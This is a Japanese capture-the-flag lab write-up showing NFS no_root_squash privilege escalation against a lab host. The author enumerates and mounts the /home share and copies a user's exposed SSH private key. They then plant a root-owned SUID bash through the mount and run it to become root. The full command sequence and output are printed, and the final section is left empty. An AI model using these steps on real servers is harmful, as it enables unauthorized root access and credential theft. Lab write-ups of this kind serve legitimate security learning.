## 1.root-squashの設定不備を突いた権限昇格
root-squashは、デフォルトではオンの設定になっているが、設定により、あるいは設定の不備（誤って設定してしまったり）によって、意図的に`root-squashをオフ`にすることができる。このことを`no-root-squash`という。  
つまり共有ディレクトリ内で、root権限の実行が可能になってしまうのと同時に、SUIDなどが設定されているファイルはroot権限で実行されてしまうことになる。  
なので恣意的にSUIDの設定がされているbashの実行体などを共有ディレクトリ送り込み、共有ディレクトリ内で実行するとroot権限でshellが取れてしまうことがある。  
  
## 2.現在判明している状況
- ターゲットIP：`10.10.144.88`
- NFSポート：`2049`  
  
## 3.実　行:列挙から侵入まで 
### 3-1.NFS 共有を一覧表示します。表示される共有の名前は何ですか?
`showmount -e`で共有可能なディレクトリの一覧を表示  
```bash
┌──(kali㉿kali)-[~]
└─$ showmount -e 10.10.144.88
Export list for 10.10.144.88:
/home *
```
  
flag：`/home`  
  

### 3-2.NFS 共有をローカルマシンにマウントします。その中のフォルダーの名前は何ですか?
- まずマウントポイントを作成する。今回は`/tmp/mount`とする。
- マウントポイントにマウントする。`sudo mount -t nfs 10.10.144.88:/home /tmp/mount`.mountコマンドに慣れよう。sudo付けないとエラーになるので注意
- `/tmp/mount`に移動してディレクトリ内を表示
```bash
┌──(kali㉿kali)-[~]
└─$ mkdir /tmp/mount  
```  
```bash
┌──(kali㉿kali)-[~]
└─$ sudo mount -t nfs 10.10.144.88:home /tmp/mount
[sudo] kali のパスワード:
```
```bash
┌──(kali㉿kali)-[~]
└─$ cd /tmp/mount/                          
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/mount]
└─$ ls            
cappucino
```
  
flag：`cappucino`  
  
 ### 3-3.ここがどんなディレクトリなのか、探索してみる。必要そうなものはダウンロードしておこう。
`ls -al`で隠しディレクトリを含め細かく見てみる。  
```bash
┌──(kali㉿kali)-[/tmp/mount]
└─$ ls -al cappucino 
合計 36
drwxr-xr-x 5 kali kali 4096  6月  4  2020 .
drwxr-xr-x 3 root root 4096  4月 22  2020 ..
-rw------- 1 kali kali    5  6月  4  2020 .bash_history
-rw-r--r-- 1 kali kali  220  4月  5  2018 .bash_logout
-rw-r--r-- 1 kali kali 3771  4月  5  2018 .bashrc
drwx------ 2 kali kali 4096  4月 22  2020 .cache
drwx------ 3 kali kali 4096  4月 22  2020 .gnupg
-rw-r--r-- 1 kali kali  807  4月  5  2018 .profile
drwx------ 2 kali kali 4096  4月 22  2020 .ssh
-rw-r--r-- 1 kali kali    0  4月 22  2020 .sudo_as_admin_successful

```
`.ssh`などがあることから、おそらく`cappucino`の`カレントホームディレクトリ`なんだろうと思料  
`.ssh`の中の公開鍵方式の鍵は使えるのでダウンロードしておく。  
  ついでにいつでも使えるように`id_rsa`の方には権限`600`を付与しておく。
```bash
┌──(kali㉿kali)-[/tmp/mount]
└─$ cd cappucino/.ssh
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ls -al          
合計 20
drwx------ 2 kali kali 4096  4月 22  2020 .
drwxr-xr-x 5 kali kali 4096  6月  4  2020 ..
-rw------- 1 kali kali  399  4月 22  2020 authorized_keys
-rw------- 1 kali kali 1679  4月 22  2020 id_rsa
-rw-r--r-- 1 kali kali  399  4月 22  2020 id_rsa.pub
```
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cp id_rsa ~/Desktop/NFS 
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cp id_rsa.pub ~/Desktop/NFS
```
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ chmod 600 ~/Desktop/NFS/id_rsa 
```
  
## 4.実　行：権限昇格/root_squashの設定不備の付く権限昇格
ここまで取得してきたものを権限昇格を実施してみる。  
当初の計画は以下の通り、
- `root_squash`がオフになっているかどうか偵察
- ターゲットの`/bin/bash`をローカルに配送
- `/bin/bash`を共有ディレクトリに配送
- `/bin/bash`を`rootオーナー`に変える
- `/bin/bash`に`SUID`を設定共有
- `ssh`で侵入
- `bash`を起動
  
では、実際にやってみる。  
  
### 4-1.`root_squash`がオフになっているかどうか偵察
`root_squash`がオフとは、つまり`no_root_squash`が設定ファイルに設定されているかということ。つまり、`no_root_squash`が設定されていると`root_squash`はオフの状態なのである。  
これを確認する方法は2つあると思った。  
  
#### O-1：`/etc/exports`を確認
`/etc/exports`とは、NFSサーバーの設定を記載するファイルである。つまるところ、`no_root_squash`の設定はここに記載されている。  
これを確認するには、一度sshでログインしてみれば実際に見てみればよい。不安要素としてはユーザに設定ファイルをのread権限がないことと、もし`ssh`や`リバースシェル`などを`初期侵入`が出来ていないときは実行できないということだろう。  
  
#### O-2：威力偵察
実際に一連で実行してみて、実行できれば`no_root_sqaush`がオフになっているという威力偵察手法  
不安要素としては、実行できないときの理由が、`root_sqaush`が設定されているからか、自身のやり方が間違っていた（あるいは誤っていた）のか評価難しいのと、実際に`root_sqaush`が設定されていたとき、これまでの工程が無駄になるという点だと思った。  
  
これら２つを評価して今回は`O-1`を採用することにした。  
実際の手順は以下の通り
- sshでログイン
- `/etc/exports`を確認
  
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ ssh -i ~/Desktop/NFS/id_rsa cappucino@10.10.144.88 

The authenticity of host '10.10.144.88 (10.10.144.88)' can't be established.
ED25519 key fingerprint is SHA256:KJ8GpDRYCTgSot8NqCbqRhNYCUarQAXuwbVuII32x/U.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.144.88' (ED25519) to the list of known hosts.
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 10 22:28:37 UTC 2024

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 16%               IP address for eth0: 10.10.144.88
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.


Last login: Thu Jun  4 14:37:50 2020

```
```bash
cappucino@polonfs:~$ less /etc/exports 

-----------------------`/etc/exports`の中身-----------------------------------

# /etc/exports: the access control list for filesystems which may be exported
#               to NFS clients.  See exports(5).
#
# Example for NFSv2 and NFSv3:
# /srv/homes       hostname1(rw,sync,no_subtree_check) hostname2(ro,sync,no_subtree_check)
#
# Example for NFSv4:
# /srv/nfs4        gss/krb5i(rw,sync,fsid=0,crossmnt,no_subtree_check)
# /srv/nfs4/homes  gss/krb5i(rw,sync,no_subtree_check)
#
/home           *(rw,no_root_squash) 　<- ココ
(END)
```
`/home           *(rw,no_root_squash)` <- ココで`no_root_squash`が設定されていることを確認できた。つまり`/home（共有ディレクトリ）`の`root_squash`ががオフになっているということである。  
   
### 4-2.ターゲットの`/bin/bash`をローカルに配送
#### 何故ターゲットの`bash`でないといけないかということの疑問
まず、何故ターゲットの`bash`でないといけないかということの疑問。つまり`ローカルのbash`を配送するのではダメなのかという点について。  
結論から言うと、`/bin/bashの互換性`の関係で、ローカルのbashをリモートサーバーに配送しても実行されないのである。  
下記はローカルから配送bashを実行した結果  
```bash
cappucino@polonfs:~$ ./bash -p
./bash: error while loading shared libraries: libtinfo.so.6: cannot open shared object file: No such file or directory

-----------訳：DeepL----------------
./bash: 共有ライブラリのロード中にエラーが発生しました: libtinfo.so.6: 共有オブジェクトファイルを開けません： そのようなファイルまたはディレクトリがありません  
```  
どうやらローカルから配送してきたbashだと`libtinfo.so.6`が読めないので、実行できないということらしい。これが互換性がないということらしい。  
なので、リモート側の環境に合わした実行体を公式からダウンロードしてサーバに配送すれば実行は可能である。  
因みに今回のリモート側とローカル側の環境は以下の通り
```bash
サーバー：

cappucino@polonfs:~$ cat /etc/os-release 
NAME="Ubuntu"
VERSION="18.04.4 LTS (Bionic Beaver)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 18.04.4 LTS"
VERSION_ID="18.04"
HOME_URL="https://www.ubuntu.com/"
SUPPORT_URL="https://help.ubuntu.com/"
BUG_REPORT_URL="https://bugs.launchpad.net/ubuntu/"
PRIVACY_POLICY_URL="https://www.ubuntu.com/legal/terms-and-policies/privacy-policy"
VERSION_CODENAME=bionic
UBUNTU_CODENAME=bionic
```
```bash
ローカル：

┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ cat /etc/os-release
PRETTY_NAME="Kali GNU/Linux Rolling"
NAME="Kali GNU/Linux"
VERSION_ID="2024.2"
VERSION="2024.2"
VERSION_CODENAME=kali-rolling
ID=kali
ID_LIKE=debian
HOME_URL="https://www.kali.org/"
SUPPORT_URL="https://forums.kali.org/"
BUG_REPORT_URL="https://bugs.kali.org/"
ANSI_COLOR="1;31"
```
結論、手段はともかく`Ubuntu 18.04.4 LTS`で実行できる`/bin/bash`が配送できればリモート側で実行することができるという  
  
#### 実際にやってみる
今回は秘密鍵をすでに取得しているので、`scp`からコピーしてくる手段をとる。  
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ scp -i ~/Desktop/NFS/id_rsa cappucino@10.10.144.88:/bin/bash ~/Desktop/NFS
bash  
```
これだけ。実際`ssh`が繋がる環境になかったらり、秘密鍵が手に入んなかったりしたら、上述の通り公式からダウンロードするという手段にならざるを得ないことも留意しておく。  
  
### 4-3.`/bin/bash`を共有ディレクトリに配送
配送といってものコピーするだけなのでそんな難しくはない。  
注意点としては、次に実施する`/bin/bashをrootオーナーに変える`と`/bin/bashにSUIDを設定する`の手順を配送前に行ってしまうと、配送先の環境に戻ってしまう（つまりローカルでの設定が全て消える）ので、とりあえずまず共有ディレクトリに配送する。
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino/.ssh]
└─$ cp ~/Desktop/NFS/bash /tmp/mount/cappucino 

```
  
### 4-4./bin/bashをrootオーナーに変える
`SUID`は`所有者の権限で実行`するというものなので、所有者をrootに変えてあげる必要がある。
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chown root bash 
```
  
### 4-5./bin/bashにSUIDを設定する
これが今回権限昇格する格の部分。しかしやること自体は簡単  
SUIDを設定しbashを実行するということは、所有者であるrootがbashを実行すること同じであるため、実行後のbashプロセスはrootで操作できるという理屈である。
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ sudo chmod +s bash
```

### 4-6.- `ssh`で侵入
### 4-7.`bash`を起動
ここは同時に実行する。  
まず純粋に`ssh`でリモートホストに侵入  
```bash
┌──(kali㉿kali)-[/tmp/mount/cappucino]
└─$ ssh -i ~/Desktop/NFS/id_rsa cappucino@10.10.144.88
Welcome to Ubuntu 18.04.4 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Mon Jun 10 23:10:18 UTC 2024

  System load:  0.0               Processes:           102
  Usage of /:   45.2% of 9.78GB   Users logged in:     0
  Memory usage: 15%               IP address for eth0: 10.10.144.88
  Swap usage:   0%


44 packages can be updated.
0 updates are security updates.

Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Mon Jun 10 23:07:18 2024 from 10.9.0.5
```
  
念のため`ls -al`でディレクトリ内とその権限等を見てみる
```bash
cappucino@polonfs:~$ ls -al
total 1284
drwxr-xr-x 5 cappucino cappucino    4096 Jun 10 23:07 .
drwxr-xr-x 3 root      root         4096 Apr 21  2020 ..
-rwsr-sr-x 1 root      cappucino 1277936 Jun 10 23:07 bash
-rw------- 1 cappucino cappucino      58 Jun 10 23:08 .bash_history
-rw-r--r-- 1 cappucino cappucino     220 Apr  4  2018 .bash_logout
-rw-r--r-- 1 cappucino cappucino    3771 Apr  4  2018 .bashrc
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .cache
drwx------ 3 cappucino cappucino    4096 Apr 22  2020 .gnupg
-rw-r--r-- 1 cappucino cappucino     807 Apr  4  2018 .profile
drwx------ 2 cappucino cappucino    4096 Apr 22  2020 .ssh
-rw-r--r-- 1 cappucino cappucino       0 Apr 22  2020 .sudo_as_admin_successful
```
bashに`SUIDが設定`されており、所有者が`root`になっていることが確認できる。  
ここまできたら後は実行するだけ。  
```bash
cappucino@polonfs:~$ ./bash -p

bash-4.4# whoami
root
```
`./bash`の`-pオプション`は、実行者の権限を保持するというオプションになる。普通にSUIDが付いていればそのままrootで実行されるものだが、bashに限っては権限をドロップすることがあるらしいので、明示的にオプションを付けて実行  
`whoami`を実行するとrootになっていることが確認できる。




### 4-.

```bash

```
  
flag：`` 